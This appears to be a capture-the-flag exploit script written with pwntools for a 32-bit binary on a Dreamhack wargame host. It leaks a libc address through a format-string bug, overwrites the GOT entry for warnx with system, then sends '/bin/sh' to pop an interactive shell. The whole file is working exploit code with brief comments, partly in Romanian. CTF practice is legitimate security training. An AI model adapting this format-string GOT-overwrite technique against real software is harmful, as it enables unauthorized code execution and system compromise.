from pwn import *
elf =  ELF("./string_patched")
libc = ELF("./libc.so.6")

context.arch = 'i386'
cyberedu = 'host8.dreamhack.games:15000'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#32-bit..
#write into s, print(s)
#The warnx() function shall display a formatted error message on the standard error stream. The last component of the program name, a colon character, and a space shall be output. If fmt is non-NULL, it shall be used as the format string for the printf() ....

#libc leka
#input fmtstr de la 5 incolo
#in init, dup2(1, 2) => stderr = stdout
#overwrite warnx.got cu system

#gdb.attach(p, gdbscript = '''
#b * 0x804876E
#c
#''')

#get libc
p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.sendline(b"%83$p")
#local merge 105, noroc cu 83 care merge si remote

p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b": ")

libc_leak = p.recvline().strip()
libc_leak = int(libc_leak, 16)
libc.address = libc_leak - 0x1b0000

system = libc.sym[b'system'] 
warnx = elf.got[b'warnx']

writes = {
warnx: system
}

print(f"libc leak is {hex(libc_leak)}")
print(f"libc is {hex(libc.address)}")

#overwrite got
payload = fmtstr_payload(5, writes)

p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.send(payload)

#actually call printf (warnx same thing) to do it
p.recvuntil(b"> ")
p.sendline(b"2")

#now send input /bin/sh

p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.send(b"/bin/sh\x00")

#pop shell
p.recvuntil(b"> ")
p.sendline(b"2")

p.interactive()
